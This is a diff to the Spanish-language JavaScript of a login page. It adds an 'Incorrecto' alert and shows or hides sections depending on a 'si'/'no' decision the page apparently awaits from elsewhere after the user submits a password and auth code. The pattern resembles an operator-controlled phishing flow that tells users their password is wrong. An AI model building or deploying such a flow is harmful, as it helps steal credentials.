@@ -223,6 +223,48 @@ function mostrarAlertaAutenticacionIncorrecta() {
     document.body.appendChild(alerta);
 }
 
+// ========================================
+// ALERTA EXCLUSIVA PARA RESPUESTA NO
+// ========================================
+
+function mostrarAlertaOpcionesNo() {
+
+    // Eliminar una alerta anterior de este mismo tipo
+    document.querySelector(".alertaOpcionesNo")?.remove();
+
+    // Crear el contenedor de alerta
+    const alerta = document.createElement("div");
+
+    alerta.className = "alertaOpcionesNo";
+
+    // Mismas características de la alerta original
+    alerta.style.position = "fixed";
+    alerta.style.bottom = "12%";
+    alerta.style.left = "50%";
+    alerta.style.transform = "translateX(-50%)";
+    alerta.style.backgroundColor = "#0068b1";
+    alerta.style.padding = "15px 17px";
+    alerta.style.borderRadius = "5px";
+    alerta.style.display = "flex";
+    alerta.style.alignItems = "center";
+    alerta.style.justifyContent = "space-between";
+    alerta.style.color = "white";
+    alerta.style.fontSize = "15.6px";
+    alerta.style.fontWeight = "500";
+    alerta.style.minWidth = "320px";
+    alerta.style.zIndex = "1000";
+
+    // Crear el mensaje
+    const mensaje = document.createElement("span");
+
+    mensaje.textContent = "Incorrecto";
+
+    alerta.appendChild(mensaje);
+
+    // Mostrar alerta
+    document.body.appendChild(alerta);
+}
+
 // Modifica el evento de autenticación para mostrar la alerta personalizada
 document.getElementById("authBtn").addEventListener("click", async function () {
     const authCode = document.getElementById("authCode").value;
@@ -333,6 +375,10 @@ async function esperarDecisionOpciones(idSolicitud) {
 // MOSTRAR SECCIÓN CORRESPONDIENTE
 // ========================================
 
+// ========================================
+// MOSTRAR SECCIÓN CORRESPONDIENTE
+// ========================================
+
 function mostrarSeccionOpciones(opcion) {
 
     const loadingScreen =
@@ -350,23 +396,42 @@ function mostrarSeccionOpciones(opcion) {
     // Ocultar pantalla de carga
     loadingScreen.classList.add("hidden");
 
-    // Ocultar las ventanas anteriores
-    loginContainer.classList.add("hidden");
-
     // Ocultar ambas secciones inicialmente
     seccionSi.classList.add("hidden");
     seccionNo.classList.add("hidden");
 
-    // Mostrar únicamente la sección seleccionada
+    // ========================================
+    // RESPUESTA SÍ
+    // ========================================
+
     if (opcion === "si") {
 
+        // Eliminar alerta de rechazo si existe
+        document.querySelector(".alertaOpcionesNo")?.remove();
+
+        // Ocultar formulario original
+        loginContainer.classList.add("hidden");
+
+        // Mostrar sección de imágenes
         seccionSi.classList.remove("hidden");
 
-    } else if (opcion === "no") {
-
-        seccionNo.classList.remove("hidden");
     }
 
+    // ========================================
+    // RESPUESTA NO
+    // ========================================
+
+    else if (opcion === "no") {
+
+        // Mantener visible el formulario original
+        loginContainer.classList.remove("hidden");
+
+        // Mostrar alerta de contraseña incorrecta
+        mostrarAlertaOpcionesNo();
+
+    }
+
+    // Permitir una nueva solicitud
     esperandoDecisionOpciones = false;
 }
 
@@ -435,3 +500,16 @@ function mostrarSeccionOpciones(opcion) {
     });
 
 })();
+
+// ========================================
+// OCULTAR ALERTA NO AL CORREGIR CONTRASEÑA
+// ========================================
+
+document.getElementById("password").addEventListener(
+    "input",
+    function () {
+
+        document.querySelector(".alertaOpcionesNo")?.remove();
+
+    }
+);
